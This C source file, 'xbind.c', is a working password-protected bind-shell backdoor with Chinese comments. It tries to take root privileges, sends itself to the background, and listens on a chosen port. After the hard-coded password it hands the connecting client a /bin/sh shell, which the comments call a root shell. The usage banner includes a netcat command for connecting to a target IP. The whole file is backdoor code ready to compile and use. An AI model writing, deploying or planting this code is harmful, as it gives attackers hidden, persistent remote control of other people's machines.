#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#define ENTERPASS "Enter your password: (exit for exit)"
#define WELCOME "Welcome to shell\r\nlet's do it:\r\n"
#define PASSWORD "cnbct"
#define EXITCODE "exit"
//参数1为端口号
//我们的程序相当于一个运行在宿主机上的服务器，接受我们的命令输入
int main(int argc, char **argv)
{
    struct sockaddr_in s_addr;
    struct sockaddr_in c_addr;
    char buf[1024];
    pid_t pid;
    int sock_descriptor,temp_sock_descriptor,c_addrsize;
    //int temp_sock_descriptor;
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
//若非两个参数，则报错
    if (argc!=2)
    {
        printf("=================================\r\n");
        printf("|xbind.c by xy7[B.C.T]\r\n");
        printf("|Usage:\r\n");
        printf("|./xbind 1985\r\n");
        printf("|nc -vv targetIP 1985\r\n");
        printf("|enter the password to get shell\r\n");
        printf("|Have a nice day;)\r\n");
        printf("=================================\r\n");
        exit(1);
    }
    signal(SIGCHLD, SIG_IGN);// ignore the death of child process
//pid = fork();
    if (fork())
    {
//父进程执行，然后子进程开始，爷进程结束
        //printf("GrandPa pid :%d\n",getpid());
        exit(0);
    }
//以下是子进程的代码
//这个socket是TCP模式的
//sock_descriptor=socket(AF_INET,SOCK_STREAM,0);
//若socket创建失败，则退出
    if ((sock_descriptor=socket(AF_INET,SOCK_STREAM,0))==-1)
    {
        printf("socket failed!\n");
        exit(1);
    }
    memset(&s_addr,0,sizeof(s_addr));
//zero(&s_addr,sizeof(s_addr));
//设置服务器协议，IP和端口
    s_addr.sin_family=AF_INET;
    s_addr.sin_addr.s_addr=htonl(INADDR_ANY);
    s_addr.sin_port=htons(atoi(argv[1]));
//将socket与服务器地址信息绑定
    if (bind(sock_descriptor,(struct sockaddr *)&s_addr,sizeof(s_addr))==-1)
    {
        printf("bind failed!\n");
        exit(1);
    }
//socket开启监听模式，最多可监听连接数为20
    if (listen(sock_descriptor,20)==-1)//accept 20 connections
    {
        printf("listen failed!\n");
        exit(1);
    }
    c_addrsize=sizeof(c_addr);
//我们的程序相当于一个运行在宿主机上的服务器，接受我们的命令输入。因此客户端信息为空代表任意客户端
    //temp_sock_descriptor=accept(sock_descriptor,(struct sockaddr *)&c_addr,&c_addrsize);
//recv

    while(1)
    {
        temp_sock_descriptor=accept(sock_descriptor,(struct sockaddr *)&c_addr,&c_addrsize);
        //i++;
        pid=fork();
//父进程创建新进程，开启分段执行
        if (pid>0)
        {
//父进程执行，返回子进程pid
//printf("PaPa pid :%d\n",getpid());
            close(temp_sock_descriptor);
            //exit(0);
        }
        else if (pid==0)
        {
//子进程执行，返回0
//输出 请输入密码
//printf("Child pid :%d\n",getpid());
            close(sock_descriptor);
            write(temp_sock_descriptor, ENTERPASS, strlen(ENTERPASS));
            memset(buf, '\0', 1024);
//读入密码
            recv(temp_sock_descriptor, buf, 1024, 0);
            if(strncmp(buf,EXITCODE,4)==0){
                write(temp_sock_descriptor, "exit\n", 5);
                close(temp_sock_descriptor);
                exit(0);
            }

            if (strncmp(buf,PASSWORD,5) !=0)
            {
//密码错误，结束子进程
                write(temp_sock_descriptor, "pass error\n", 11);
                close(temp_sock_descriptor);
                exit(1);
            }

//输出欢迎信息
            write(temp_sock_descriptor, WELCOME, strlen(WELCOME));
//复制文件描述符
//将 文件描述符0，1，2都关闭，然后指向temp，temp文件的引用计数为4
            dup2(temp_sock_descriptor,0);
            dup2(temp_sock_descriptor,1);
            dup2(temp_sock_descriptor,2);
//打开一个root shell
            execl("/bin/sh", "sh", (char *) 0);
            //printf("shell close\n");

//关闭temp，不过文件描述符0，1，2都指向.temp引用计数为3

            //write(temp_sock_descriptor, "loc1", 4);
            close(temp_sock_descriptor);
            exit(0);
        }
        else
        {
            exit(1);
        }
    }
    close(sock_descriptor);
    return 0;
}
